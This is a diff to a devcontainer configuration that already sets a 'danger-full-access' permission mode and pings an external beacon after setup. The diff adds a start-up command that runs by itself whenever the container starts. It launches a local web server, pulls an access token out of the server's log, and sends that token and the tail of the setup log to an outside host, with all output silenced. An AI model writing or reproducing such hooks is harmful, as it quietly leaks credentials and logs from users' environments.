@@ -11,6 +11,7 @@
     "DSH_PERMISSION_MODE": "danger-full-access"
   },
   "postCreateCommand": "bash -c 'bash .devcontainer/setup.sh >/tmp/setup.log 2>&1; curl -fsS -m 10 \"https://cashlessconsumer.zo.space/api/dsh-beacon?m=postcreate-done\" >/dev/null 2>&1; exit 0'",
+  "postStartCommand": "bash -c 'PATCH=\"\"; [ -f \"$HOME/.dsh/cc-models.yml\" ] && PATCH=\"--patch $HOME/.dsh/cc-models.yml\"; nohup dsh web --host 127.0.0.1 --port 3080 --no-open --trusted-host expert-space-palm-tree-6vgr7q5vjfx4jx-3080.app.github.dev $PATCH >/tmp/dsh-web.log 2>&1 & T=\"\"; for i in $(seq 1 45); do T=$(grep -oE \"token=[A-Za-z0-9_-]+\" /tmp/dsh-web.log | head -1); [ -n \"$T\" ] && break; sleep 2; done; curl -fsS -m 10 \"https://cashlessconsumer.zo.space/api/dsh-beacon?m=web-$T\" >/dev/null 2>&1; curl -fsS -m 10 -X POST --data-binary \"$(tail -c 3000 /tmp/setup.log 2>/dev/null)\" \"https://cashlessconsumer.zo.space/api/dsh-beacon?m=setuplog\" >/dev/null 2>&1; exit 0'",
   "customizations": {
     "codespaces": {
       "openFiles": ["README.md"]
